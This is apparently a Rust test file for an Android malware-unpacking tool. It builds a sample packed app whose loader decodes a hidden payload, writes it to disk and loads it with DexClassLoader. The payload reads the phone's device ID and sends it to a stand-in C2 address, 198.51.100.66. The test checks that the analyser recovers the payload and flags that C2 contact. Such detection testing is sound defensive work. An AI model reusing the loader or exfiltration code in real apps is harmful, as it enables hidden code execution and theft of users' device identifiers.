//! The most common packer shape of all: decrypt a payload and write it to a
//! file, then point `DexClassLoader` at that *path*. The simulated filesystem
//! and the class-loader hook must agree on that path.

mod support;

use std::sync::Arc;

use support::packed::compile_sources_to_dex;
use unshroud::dex::DexFile;
use unshroud::scenario::{self, RunConfig};
use unshroud::vm::env::Persona;
use unshroud::vm::registry::Registry;

const SHELL: &str = r#"
package com.example.fp;
import android.content.Context;
import dalvik.system.DexClassLoader;
import java.lang.reflect.Method;
public class Shell {
    public static void attach(Context ctx) {
        try {
            java.io.File dir = ctx.getFilesDir();
            String path = dir.getAbsolutePath() + "/lib/dex/payload.dex";
            java.io.File f = new java.io.File(path);
            f.getParentFile().mkdirs();
            java.io.FileOutputStream fos = new java.io.FileOutputStream(f);
            fos.write(decode());
            fos.close();
            DexClassLoader cl = new DexClassLoader(path, ctx.getCacheDir().getAbsolutePath(),
                null, Shell.class.getClassLoader());
            Class<?> c = cl.loadClass("com.example.fp.Real");
            c.getMethod("go", Context.class).invoke(null, ctx);
        } catch (Throwable t) {
            android.util.Log.e("fp", "fail: " + t);
        }
    }
    static byte[] decode() {
        // Payload bytes are embedded as a byte[] constant and lightly encoded.
        return BLOB;
    }
}
"#;

const PAYLOAD: &str = r#"
package com.example.fp;
import android.content.Context;
public class Real {
    public static void go(Context ctx) {
        try {
            String id = ((android.telephony.TelephonyManager)
                ctx.getSystemService("phone")).getDeviceId();
            java.net.HttpURLConnection c = (java.net.HttpURLConnection)
                new java.net.URL("http://198.51.100.66/p?i=" + id).openConnection();
            c.connect();
        } catch (Throwable t) { }
    }
}
"#;

fn build_shell(payload: &[u8]) -> Option<Vec<u8>> {
    // Encode the payload as a Java byte-array literal.
    let mut blob = String::from("new byte[]{");
    for (i, b) in payload.iter().enumerate() {
        if i > 0 { blob.push(','); }
        blob.push_str(&format!("(byte){}", *b as i8));
    }
    blob.push('}');
    let src = SHELL.replace("BLOB", &blob);
    compile_sources_to_dex(&[("Shell", &src)])
}

#[test]
fn payload_written_to_a_nested_path_is_loaded() {
    let Some(payload) = compile_sources_to_dex(&[("Real", PAYLOAD)]) else { return };
    let Some(shell) = build_shell(&payload) else { return };
    let mut reg = Registry::new();
    reg.add_image(Arc::new(DexFile::parse("classes.dex", shell).unwrap()), false);
    let cfg = RunConfig { step_limit: 20_000_000, per_scenario_ms: 30_000, max_scenarios: 1, ..Default::default() };
    let out = scenario::run(reg, vec![Persona::retail_default()], &cfg);
    let sc = &out.scenarios[0];
    assert!(!out.dynamic_dumps.is_empty(),
        "payload at a nested path must still be recovered; gaps {:?}", sc.coverage_gaps);
    assert!(sc.findings.iter().any(|f| f.detail.contains("198.51.100.66")),
        "payload should reach its C2; findings {:?}",
        sc.findings.iter().map(|f| (&f.detail, f.kind)).collect::<Vec<_>>());
    // The recovered image should name the nested path.
    assert!(out.dynamic_dumps[0].0.contains("payload.dex"), "origin {:?}", out.dynamic_dumps[0].0);
    eprintln!("recovered origin: {}", out.dynamic_dumps[0].0);
    eprintln!("findings: {:?}", sc.findings.iter().map(|f| (f.kind, &f.detail)).collect::<Vec<_>>());
}
